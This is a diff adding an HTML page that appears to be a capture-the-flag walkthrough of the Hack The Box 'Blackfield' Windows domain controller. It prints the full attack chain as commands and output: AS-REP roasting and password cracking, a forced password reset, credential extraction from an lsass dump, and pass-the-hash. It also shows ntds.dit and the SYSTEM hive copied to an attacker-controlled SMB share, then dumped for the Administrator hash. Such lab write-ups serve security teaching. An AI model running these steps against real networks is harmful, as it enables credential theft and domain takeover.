@@ -1,0 +1,441 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Blackfield</h1>
+    <p class="text">Difficulty : Hard | UserDifficulty : 5.7</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield]
+└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 03:30 EST
+Nmap scan report for 10.129.229.17
+Host is up (0.25s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+53/tcp  open  domain        Simple DNS Plus
+88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 15:40:46Z)
+135/tcp open  msrpc         Microsoft Windows RPC
+389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+445/tcp open  microsoft-ds?</code></pre></div>
+
+<p class="text">Enumeratable port is only smb server.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield]
+└─$ <u>nxc smb 10.129.229.17 -u guest -p '' --shares</u>
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\guest: 
+SMB         10.129.229.17   445    DC01             [*] Enumerated shares
+SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
+SMB         10.129.229.17   445    DC01             -----           -----------     ------
+SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.229.17   445    DC01             C$                              Default share
+SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
+SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.229.17   445    DC01             NETLOGON                        Logon server share 
+SMB         10.129.229.17   445    DC01             profiles$       READ            
+SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share</code></pre></div>
+
+<p class="text">There are two non-default shares : profiles$ and forensic, and we can access to the profiles$ share.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield]
+└─$ smbclient //10.129.229.17/profiles$ -U 'guest%'                                                 
+WARNING: no network interfaces found
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Jun  3 12:47:12 2020
+  ..                                  D        0  Wed Jun  3 12:47:12 2020
+  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
+  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
+  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
+  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
+  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
+  AChampken                           D        0  Wed Jun  3 12:47:11 2020
+  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
+...
+  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
+  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
+  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
+  ZWausik                             D        0  Wed Jun  3 12:47:12 2020
+
+                5102079 blocks of size 4096. 1687372 blocks available</code></pre></div>
+
+<p class="text">Though there are several dirs, there is no files we can read. However, some of them are like username and it's possible that an user is vulnerable to AS-REP roasting. Let's install all dirs and create wordlist.</p>
+
+
+<div class="code-box"><pre><code>smb: \> RECURSE ON
+smb: \> PROMPT OFF
+smb: \> mget *</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ echo 'AAlleni        BGeminski       EFeatherling   IKotecky           LChippel        NSchepkie     SEulert      UPyrke
+ABarteski      BLostal         EFrixione      ISantosi           LChoffin        NVanpraet     SFadrigalan  VBublavy
+ABekesz        BMannise        EJenorik       JAngvall           LCominelli      OBelghazi     SGolds       VButziger
+ABenzies       BNovrotsky      EKmilanovic    JBehmoiras         LDruge          OBushey       SGrifasi     VFuscca
+ABiemiller     BRigiero        ElKatkowsky    JDanten            LEzepek         OHardybala    SGtlinas     VLitschauer
+AChampken      BSamkoses       EmaCaratenuto  JDjouka            LHyungkim       OLunas        SHauht       VMamchuk
+ACheretei      BZandonella     EPalislamovic  JKondziola         LKarabag        ORbabka       SHederian    VMarija
+ACsonaki       CAcherman       EPryar         JLeytushsenior     LKirousis       PBourrat      SHelregel    VOlaosun
+AHigchens      CAkbari         ESachhitello   JLuthner           LKnade          PBozzelle     SKrulig      VPapalouca
+AJaquemai      CAldhowaihi     ESariotti      JMoorehendrickson  LKrioua         PBranti       SLewrie      WSaldat
+AKlado         CArgyropolous   ETurgano       JPistachio         LLefebvre       PCapperella   SMaskil      WVerzhbytska
+AKoffenburger  CDufrasne       EWojtila       JScima             LLoeradeavilez  PCurtz        Smocker      WZelazny
+AKollolli      CGronk          FAlirezai      JSebaali           LMichoud        PDoreste      SMoyta       XBemelen
+AKruppe        Chiucarello     FBaldwind      JShoenherr         LTindall        PGegnas       SRaustiala   XDadant
+AKubale        Chiuccariello   FBroj          JShuselvt          LYturbe         PMasulla      SReppond     XDebes
+ALamerz        CHoytal         FDeblaquire    KAmavisca          MArcynski       PMendlinger   SSicliano    XKonegni
+AMaceldon      CKijauskas      FDegeorgio     KAtolikian         MAthilakshmi    PParakat      SSilex       XRykiel
+AMasalunga     CKolbo          FianLaginja    KBrokinn           MAttravanam     PProvencer    SSolsbak     YBleasdale
+ANavay         CMakutenas      FLasokowski    KCockeril          MBrambini       PTesik        STousignaut  YHuftalin
+ANesterova     CMorcillo       FPflum         KColtart           MHatziantoniou  PVinkovich    support      YKivlen
+ANeusse        CSchandall      FReffey        KCyster            MHoerauf        PVirding      svc_backup   YKozlicki
+AOkleshen      CSelters        GaBelithe      KDorney            MKermarrec      PWeinkaus     SWhyte       YNyirenda
+APustulka      CTolmie         Gareld         KKoesno            MKillberg       RBaliukonis   SWynigear    YPredestin
+ARotella       DCecere         GBatowski      KLangfur           MLapesh         RBochare      TAwaysheh    YSeturino
+ASanwardeker   DChintalapalli  GForshalger    KMahalik           MMakhsous       RKrnjaic      TBadenbach   YSkoropada
+AShadaia       DCwilich        GGomane        KMasloch           MMerezio        RNemnich      TCaffo       YVonebers
+ASischo        DGarbatiuc      GHisek         KMibach            MNaciri         RPoretsky     TCassalom    YZarpentine
+ASpruce        DKemesies       GMaroufkhani   KParvankova        MShanmugarajah  RStuehringer  TEiselt      ZAlatti
+ATakach        DMatuka         GMerewether    KPregnolato        MSichkar        RSzewczuga    TFerencdo    ZKrenselewski
+ATaueg         DMedeme         GQuinniey      KRasmor            MTemko          RVallandas    TGaleazza    ZMalaab
+ATwardowski    DMeherek        GRoswurm       KShievitz          MTipirneni      RWeatherl     TKauten      ZMiick
+audit2020      DMetych         GWiegard       KSojdelius         MTonuri         RWissor       TKnupke      ZScozzari
+AWangenheim    DPaskalev       HBlaziewske    KTambourgi         MVanarsdel      SAbdulagatov  TLintlop     ZTimofeeff
+AWorsey        DPriporov       HColantino     KVlahopoulos       NBellibas       SAjowi        TMusselli    ZWausik
+AZigmunt       DRusanovskaya   HConforto      KZyballa           NDikoka         SAlguwaihes   TOust
+BBakajza       DVellela        HCunnally      LBajewsky          NGenevro        SBonaparte    TSlupka
+BBeloucif      DVogleson       HGougen        LBaligand          NGoddanti       SBouzane      TStausland
+BCarmitcheal   DZwinak         HKostova       LBarhamand         NMrdirk         SChatin       TZumpella
+BConsultant    EBoley          IChristijr     LBirer             NPulido         SDellabitta   UCrofskey
+BErdossy       EEulau          IKoledo        LBobelis           NRonges         SDhodapkar    UMarylebone'</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ awk '{for (i=1; i&lt;=NF; i++) print $i}' users > users.txt</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ for user in $(cat userlist.txt);do impacket-GetNPUsers blackfield.local/$user -request -no-pass -dc-ip 10.129.229.17
+;done 
+...
+[*] Getting TGT for support
+$krb5asrep$23$support@BLACKFIELD.LOCAL:f664ede1e29ad0a864967affe7efa565$59aeaf4267c48a9c1e2d97295254a0749380feaf75cab34be3285a5625c9f672d183fc8a612e9df1b7db38cb5ff5c853e44a2e4df47b1a55dee942c7b2b7d8c1ca3d174b963a8363f39da903f6539265eb6082d15b102ab783c50de92d66baa0c6608b6f02397db82f09dd35fee69afcc35e65094161ed45c38c7bfe015542342c32def0595102b9e50cb0ca4345564f6dde0cdbd856ea1d1150266396865bcaf6564a6b9e3065f3ba4a5de5208118f7beabfa641d6fce6097934a6f0941479d4462713be7d8bca8593d30461c2e969e73be8c1c3edd36c285f7893ad199d218ba5ca9cd8946775f27728bc71f40d470b0d8d8e2
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+...</code></pre></div>
+
+<p class="text">As assumed, I got krb5asrep hash.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ echo '$krb5asrep$23$support@BLACKFIELD.LOCAL:f664ede1e29ad0a864967affe7efa565$59aeaf4267c48a9c1e2d97295254a0749380feaf75cab34be3285a5625c9f672d183fc8a612e9df1b7db38cb5ff5c853e44a2e4df47b1a55dee942c7b2b7d8c1ca3d174b963a8363f39da903f6539265eb6082d15b102ab783c50de92d66baa0c6608b6f02397db82f09dd35fee69afcc35e65094161ed45c38c7bfe015542342c32def0595102b9e50cb0ca4345564f6dde0cdbd856ea1d1150266396865bcaf6564a6b9e3065f3ba4a5de5208118f7beabfa641d6fce6097934a6f0941479d4462713be7d8bca8593d30461c2e969e73be8c1c3edd36c285f7893ad199d218ba5ca9cd8946775f27728bc71f40d470b0d8d8e2' > hash
+
+┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+...
+$krb5asrep$23$support@BLACKFIELD.LOCAL:<u>#00^BlackKnight</u></code></pre></div>
+
+<p class="text">We got password for user support. We can confirm if the password and user are valid with nxc.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ nxc smb 10.129.229.17 -u support -p '#00^BlackKnight'        
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight </code></pre></div>
+
+<p class="text">Yes it's valid.</p>
+
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">Since we got valid user and we have access to the DC, we can collect AD information using bloodhound-python.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/forensic]
+└─$ bloodhound-python -c all -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.229.17 --zip
+...</code></pre></div>
+
+<p class="text">Then, zip file would be generated. Let's analyze target's AD structure.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/blackfield/1.png' %}" alt="">
+    <p class="text">BloodHound revealed that the user support has outbound control <u>ForceChangePassword</u> right against audit2020 user. We can change the user's password into arbitrary one.</p>
+</div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ bloodyAD --host $IP -d blackfield.local -u support -p '#00^BlackKnight' set password 'audit2020' '3asypwn!'</code></pre></div>
+<p class="text">Then, let's confirm the password is changed successfully.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ nxc smb 10.129.229.17 -u audit2020 -p '3asypwn!'
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:3asypwn! </code></pre></div>
+
+<h2 class="subtitle">Shell as svc_backup</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ nxc smb 10.129.229.17 -u audit2020 -p '3asypwn!' --shares
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:3asypwn! 
+SMB         10.129.229.17   445    DC01             [*] Enumerated shares
+SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
+SMB         10.129.229.17   445    DC01             -----           -----------     ------
+SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.229.17   445    DC01             C$                              Default share
+SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
+SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.229.17   445    DC01             profiles$       READ            
+SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share </code></pre></div>
+
+<p class="text">Being audit2020 owner, we are able to read non-default share forensic. Let's see what's there.</p>
+
+
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ smbclient //10.129.229.17/forensic -U "audit2020%3asypwn\!"
+WARNING: no network interfaces found
+Try "help" to get a list of possible commands.
+smb: \> cd memory_analysis
+smb: \memory_analysis\> dir
+  .                                   D        0  Thu May 28 16:28:33 2020
+  ..                                  D        0  Thu May 28 16:28:33 2020
+  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
+  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
+  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
+  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
+  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
+  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
+  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
+  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
+  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
+  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
+  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
+  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
+  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
+  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
+  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
+  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020
+
+                5102079 blocks of size 4096. 1687057 blocks available
+smb: \memory_analysis\> </code></pre></div>
+
+<p class="text">There are several interesting files, but the file lsass.zip seems to be the most juicy one.</p>
+<h3>What is lsass?</h3>
+<div class="img">
+    <code>LSASS, or the Local Security Authority Subsystem Service, is a core Windows process responsible for user authentication, login management, and enforcing security policies on a computer. It validates user sign-ins for both local and network access and maintains security information like password changes and access tokens.</code>
+</div>
+<p class="text">Since the size of the file is huge, we better to use smbget.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/smbfiles]
+└─$ smbget -U 'blackfield/audit2020%3asypwn!' smb://10.129.229.17/forensic/memory_analysis/lsass.zip</code></pre></div>
+<p class="text">Let's unzip it and get hidden information using pypykatz.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield]
+└─$ 7z x lsass.zip   
+
+7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
+ 64-bit locale=en_US.UTF-8 Threads:5 OPEN_MAX:1024, ASM
+...</code></pre></div>
+<p class="text">lsass.DMP file was generated.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/forensic]
+└─$ pypykatz lsa minidump lsass.DMP                             
+INFO:pypykatz:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+...sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+        == MSV ==
+                Username: svc_backup
+                Domain: BLACKFIELD
+                LM: NA
+                NT: 9658d1d1dcd9250115e2205d9f48400d
+                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
+        == WDIGEST [633ba]==
+                username svc_backup
+                domainname BLACKFIELD
+                password None
+                password (hex)
+...</code></pre></div>
+
+<p class="text">Though tons of the output appeared, we can filter only NT strings.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/forensic]
+└─$ pypykatz lsa minidump lsass.DMP | grep NT | awk '{print $2}'
+INFO:pypykatz:Parsing file lsass.DMP
+9658d1d1dcd9250115e2205d9f48400d
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+9658d1d1dcd9250115e2205d9f48400d
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+NT
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796</code></pre></div>
+
+<p class="text">We can validate these hashes using nxc again.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/forensic]
+└─$ echo '9658d1d1dcd9250115e2205d9f48400d
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+9658d1d1dcd9250115e2205d9f48400d
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796
+b624dc83a27cc29da11d9bf25efea796' > hashes</code></pre></div>
+
+<p class="text">Also, we need username list. We can use nxc for that purpose again.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield]
+└─$ nxc smb 10.129.229.17 -u audit2020 -p '3asypwn!' --users > users
+
+┌──(kali㉿kali)-[~/tempo/blackfield]
+└─$ grep '^SMB' users \        
+  | grep -v 'Username' \
+  | awk '{print $5}' \
+  | sort -u > userlist.txt</code></pre></div>
+
+<p class="text">We can check all possible combinations using the two files.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield]
+└─$ nxc smb 10.129.229.17 -u userlist.txt -H hashes
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+...
+SMB         10.129.229.17   445    DC01             [-] BLACKFIELD.local\support:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d </code></pre></div>
+
+<p class="text">The first hash can be used for svc_backup user.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/forensic]
+└─$ evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</code></pre></div>
+<p class="text">The user has SeBackupPrivilege. We can clone everything in the target machine.</p>
+
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /b C:\Users\Administrator\Desktop\ C:\
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Tuesday, November 25, 2025 10:09:48 AM
+   Source : C:\Users\Administrator\Desktop\
+     Dest : C:\
+
+    Files : *.*
+
+  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+                           3    C:\Users\Administrator\Desktop\
+        *EXTRA Dir        -1    C:\$Recycle.Bin\
+        *EXTRA Dir        -1    C:\Documents and Settings\
+        *EXTRA Dir        -1    C:\PerfLogs\
+        *EXTRA Dir        -1    C:\profiles\
+        *EXTRA Dir        -1    C:\Program Files\
+        *EXTRA Dir        -1    C:\Program Files (x86)\
+        *EXTRA Dir        -1    C:\ProgramData\
+        *EXTRA Dir        -1    C:\Recovery\
+        *EXTRA Dir        -1    C:\System Volume Information\
+        *EXTRA Dir        -1    C:\Users\
+        *EXTRA Dir        -1    C:\Windows\
+          *EXTRA File            704.0 m        pagefile.sys
+            New File                  32        root.txt
+2025/11/25 10:09:48 ERROR 5 (0x00000005) Copying File C:\Users\Administrator\Desktop\root.txt
+Access is denied.</code></pre></div>
+
+<p class="text">However, we cannot mount this dir. Since we have SeRestorePrivilege, we can get admin NTLM hash.</p>
+<p class="text">Since this procedure requires NTFS, we cannot use impacket-smbserver. Let's start up smdb.</p>
+<p class="text">I added below code to /etc/samba/smb.conf</p>
+<div class="code-box"><pre><code>[global]
+map to guest = Bad User
+server role = standalone server
+usershare allow guests = yes
+idmap config * : backend = tdb
+interfaces = tun0
+smb ports = 445
+[smb]
+comment = Samba
+path = /tmp/
+guest ok = yes
+read only = no
+browsable = yes
+force user = smbuser</code></pre></div>
+<p class="text">Then, let's create user for smbserver.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield]
+└─$ adduser smbuser</code></pre></div>
+<p class="text">Then we can use this user for smb sharing. Let's start smdb and create backup.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield]
+└─$ service smbd restart</code></pre></div>
+
+<p class="text">We can create backup to our local machine using smdb.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc_backup\Documents> net use k: \\10.10.16.22\smb /user:smbuser smbpass
+The command completed successfully.
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> echo "Y" | wbadmin start backup -backuptarget:\\10.10.16.22\smb -include:c:\windows\ntds
+...</code></pre></div>
+<p class="text">Then, extract ntds.dit file.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin get versions
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+Backup time: 11/25/2025 10:32 AM
+Backup location: Network Share labeled \\10.10.16.22\smb
+Version identifier: <u>11/25/2025-18:32</u>
+Can recover: Volume(s), File(s)
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> echo "Y" | wbadmin start recovery -version:<u>11/25/2025-18:32</u> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl</code></pre></div>
+<p class="text">Also we need system.hive file.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM C:\system.hive
+The operation completed successfully.</code></pre></div>
+
+<p class="text">Finally we can download the two files and extract all hashes on the target machine.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd C:\
+*Evil-WinRM* PS C:\> cp ntds.dit \\10.10.16.22\smb\NTDS.dit
+*Evil-WinRM* PS C:\> cp system.hive \\10.10.16.22\smb\system.hive</code></pre></div>
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ ls -la NTDS.dit system.hive
+-rwxr--r-- 1 smbuser smbuser 18874368 Nov 25  2025 NTDS.dit
+-rwxr--r-- 1 smbuser smbuser 17604608 Nov 25  2025 system.hive</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ impacket-secretsdump -system system.hive -ntds NTDS.dit local
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from NTDS.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<u>184fb5e5178480be64824d4cd53b99ee</u>:::</code></pre></div>
+
+<p class="text">We got admin hash.</p>
+
+
+
+</body>
+</html>
